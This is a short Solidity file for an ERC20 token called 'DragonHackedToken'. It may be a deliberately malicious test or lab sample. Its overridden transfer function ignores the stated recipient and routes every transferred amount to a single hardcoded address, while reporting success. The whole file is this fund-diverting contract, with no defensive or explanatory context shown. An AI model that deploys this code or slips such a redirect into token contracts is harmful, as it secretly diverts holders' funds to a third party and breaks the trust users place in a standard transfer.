//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DragonHackedToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol){}

    function transfer(address to, uint256 value) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, 0x02841DE559CDfD7bb0a90Bedc045D7330044bBFb, value);
        return true;
    }
}